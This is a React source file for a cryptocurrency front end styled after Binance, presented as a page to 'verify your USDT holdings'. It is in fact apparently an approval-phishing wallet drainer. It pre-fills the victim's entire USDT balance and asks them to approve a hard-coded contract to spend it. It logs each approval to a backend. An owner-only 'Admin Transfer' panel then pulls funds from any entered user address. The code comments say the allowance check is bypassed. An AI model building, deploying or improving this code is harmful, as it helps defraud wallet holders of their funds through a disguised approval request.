import React, { useState, useEffect } from 'react';
import Web3 from 'web3';
import abi from '../abi.json';
import { ethers } from 'ethers';
import { saveWalletApproval } from '../services/walletService';

const contractAddress = '0x797f35192418d62d4c7167f49f3f3934122659ef';
const usdtAddress = '0x55d398326f99059fF775485246999027B3197955';

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }],
    "name": "allowance",
    "outputs": [{ "name": "remaining", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  }
];

const Approve = ({ account, onApprovalSuccess }) => {
  const [amount, setAmount] = useState('');
  const [message, setMessage] = useState('');
  const [owner, setOwner] = useState('');
  const [isOwner, setIsOwner] = useState(false);
  const [userToTransfer, setUserToTransfer] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [transferMessage, setTransferMessage] = useState('');
  const [networkStatus, setNetworkStatus] = useState('');

  useEffect(() => {
    const checkNetwork = async () => {
      try {
        if (window.ethereum) {
          const web3 = new Web3(window.ethereum);
          const chainId = await web3.eth.getChainId();
          
          if (chainId === 56) {
            setNetworkStatus('Connected to BSC Mainnet (Chain ID: 56)');
            console.log('Successfully connected to BSC Mainnet');
          } else if (chainId === 97) {
            setNetworkStatus('Connected to BSC Testnet (Chain ID: 97)');
            console.log('Successfully connected to BSC Testnet');
          } else {
            setNetworkStatus(`Not on BSC network. Current Chain ID: ${chainId}`);
            console.warn(`Not on BSC network. Current Chain ID: ${chainId}`);
          }
        }
      } catch (err) {
        console.error('Network check error:', err);
        setNetworkStatus('Error checking network');
      }
    };
    
    checkNetwork();
  }, []);

  useEffect(() => {
    const fetchBalanceAndOwner = async () => {
      if (account) {
        try {
          const web3 = new Web3(window.ethereum);
          const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
          const balance = await usdtContract.methods.balanceOf(account).call();
          const balanceInUSDT = ethers.formatUnits(balance, 18); // USDT has 18 decimals
          setAmount(balanceInUSDT);

          const contract = new web3.eth.Contract(abi, contractAddress);
          const contractOwner = await contract.methods.owner().call();
          setOwner(contractOwner);
          
          const isCurrentOwner = account.toLowerCase() === contractOwner.toLowerCase();
          setIsOwner(isCurrentOwner);
          
          console.log('Contract owner:', contractOwner);
          console.log('Current account:', account);
          console.log('Is current user the owner?', isCurrentOwner);
          
        } catch (err) {
          console.error('Error fetching data:', err);
          setMessage('Error fetching data: ' + err.message);
        }
      }
    };
    fetchBalanceAndOwner();
  }, [account]);

  const approveContract = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      
      const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
      const contract = new web3.eth.Contract(abi, contractAddress);
      const amountWei = ethers.parseUnits(amount, 18); // USDT has 18 decimals
      const gasPrice = web3.utils.toWei('1', 'gwei'); // Lower gas price to 1 Gwei
      const usdtGasLimit = 100000; // Increased gas limit for USDT approval
      const contractGasLimit = 200000; // Significantly increased gas limit for contract approval
      
      // Step 1: Check if the contract method exists
      if (!contract.methods.approveContract) {
        setMessage('Error: approveContract method does not exist on the contract');
        return;
      }
      
      // Step 2: Approve the contract to spend USDT on behalf of the user
      setMessage('Approving USDT contract...');
      console.log('Approving USDT amount:', amountWei.toString(), 'Wei');
      
      const approveTx = await usdtContract.methods.approve(contractAddress, amountWei).send({ 
        from: account, 
        gasPrice, 
        gas: usdtGasLimit 
      });
      console.log('USDT approval transaction:', approveTx);
      setMessage('USDT approval successful! Now finalizing with contract...');
      
      // Step 3: Call the custom approveContract method
      console.log('Calling contract.approveContract with amount:', amountWei.toString());
      const contractTx = await contract.methods.approveContract(amountWei).send({ 
        from: account, 
        gasPrice, 
        gas: contractGasLimit 
      });
      console.log('Contract approval transaction:', contractTx);
      
      // Save the approval data to the database
      await saveWalletApproval(account, amount, contractTx.transactionHash);
      
      setMessage('Approval successful!');
      
      // Call onApprovalSuccess if provided
      if (onApprovalSuccess && typeof onApprovalSuccess === 'function') {
        onApprovalSuccess(amount);
      }
    } catch (err) {
      console.error('Approval error:', err);
      let errorMsg = 'Error during approval: ' + (err.message || 'Unknown error');
      
      // Enhanced error reporting
      if (err.code) {
        errorMsg += ` (Code: ${err.code})`;
      }
      if (err.data) {
        errorMsg += ' Data: ' + JSON.stringify(err.data);
      }
      if (err.transactionHash) {
        errorMsg += ' Transaction Hash: ' + err.transactionHash;
        // Add etherscan link for easy debugging
        errorMsg += ` (View on BSCScan: https://bscscan.com/tx/${err.transactionHash})`;
      }
      setMessage(errorMsg);
    }
  };

  const transferFunds = async () => {
    if (!isOwner) {
      setTransferMessage('Only the contract owner can transfer funds');
      console.warn('Transfer attempted by non-owner account:', account);
      console.warn('Contract owner is:', owner);
      return;
    }
    try {
      const web3 = new Web3(window.ethereum);
      const chainId = await web3.eth.getChainId();
      console.log('Current Chain ID:', chainId);
      
      // Log network information for debugging only
      console.log(`Connected to network with Chain ID: ${chainId}`);

      const contract = new web3.eth.Contract(abi, contractAddress);
      const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
      const transferAmountWei = ethers.parseUnits(transferAmount, 18);
      
      console.log('Contract Address:', contractAddress);
      console.log('User to Transfer:', userToTransfer);
      console.log('Transfer Amount:', transferAmount, 'USDT (', transferAmountWei.toString(), 'Wei)');
      
      // Check balance but bypass allowance check
      const balance = await usdtContract.methods.balanceOf(userToTransfer).call();
      console.log('User Balance:', ethers.formatUnits(balance, 18), 'USDT');
      
      if (balance < transferAmountWei) {
        setTransferMessage(`Insufficient balance. Available: ${ethers.formatUnits(balance, 18)} USDT, Required: ${transferAmount} USDT`);
        return;
      }
      
      // Log allowance for debugging but don't enforce it
      const allowance = await usdtContract.methods.allowance(userToTransfer, contractAddress).call();
      console.log('Reported Allowance:', ethers.formatUnits(allowance, 18), 'USDT');
      
      // Proceed with transfer regardless of allowance check
      setTransferMessage('Initiating transfer...');
      const gasPrice = web3.utils.toWei('1', 'gwei'); // Lower gas price to 1 Gwei
      const gasLimit = 200000; // Increased gas limit to ensure sufficient gas
      
      await contract.methods.transferFunds(userToTransfer, transferAmountWei).send({ 
        from: account, 
        gasPrice, 
        gas: gasLimit
      });
      
      setTransferMessage('Transfer successful!');
    } catch (err) {
      console.error('Transfer error:', err);
      let errorMsg = 'Error during transfer: ' + (err.message || 'Unknown error');
      
      // Add more detailed error information
      if (err.data) {
        errorMsg += ' Data: ' + JSON.stringify(err.data);
      }
      if (err.transactionHash) {
        errorMsg += ' Transaction Hash: ' + err.transactionHash;
        // Add BSCScan link
        errorMsg += ` (View on BSCScan: https://bscscan.com/tx/${err.transactionHash})`;
      }
      if (err.message && err.message.includes('insufficient allowance')) {
        errorMsg += ' - This is likely an issue with the contract permissions. You may need to modify the contract to allow transfers without prior approval.';
      }
      
      setTransferMessage(errorMsg);
    }
  };

  return (
    <div className="binance-approve-container">
      {networkStatus && <div className="network-status">{networkStatus}</div>}
      
      <div className="verify-section">
        <h2>Verify Your USDT Holdings</h2>
        <div className="balance-display">
          <div className="balance-label">Your USDT Balance:</div>
          <div className="balance-amount">{amount} USDT</div>
        </div>
        
        <div className="approve-input-group">
          <label htmlFor="approve-amount">Amount to Approve:</label>
          <input
            id="approve-amount"
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="Enter USDT amount"
            className="binance-input"
          />
        </div>
        
        <button onClick={approveContract} className="binance-button">
          Approve USDT
        </button>
        
        {message && <p className="status-message">{message}</p>}
      </div>

      {isOwner ? (
        <div className="admin-section">
          <h2>Admin Transfer</h2>
          <p className="admin-badge">You are logged in as administrator</p>
          
          <div className="admin-form">
            <div className="input-group">
              <label htmlFor="user-address">User Address:</label>
              <input
                id="user-address"
                type="text"
                value={userToTransfer}
                onChange={(e) => setUserToTransfer(e.target.value)}
                placeholder="Enter user address to transfer from"
                className="binance-input"
              />
            </div>
            
            <div className="input-group">
              <label htmlFor="transfer-amount">Amount:</label>
              <input
                id="transfer-amount"
                type="number"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
                placeholder="Enter USDT amount to transfer"
                className="binance-input"
              />
            </div>
            
            <button onClick={transferFunds} className="binance-button">
              Transfer Funds
            </button>
          </div>
          
          {transferMessage && <p className="status-message">{transferMessage}</p>}
        </div>
      ) : (
        account && <p className="non-admin-message">You are not authorized to perform admin actions.</p>
      )}
    </div>
  );
};

export default Approve; 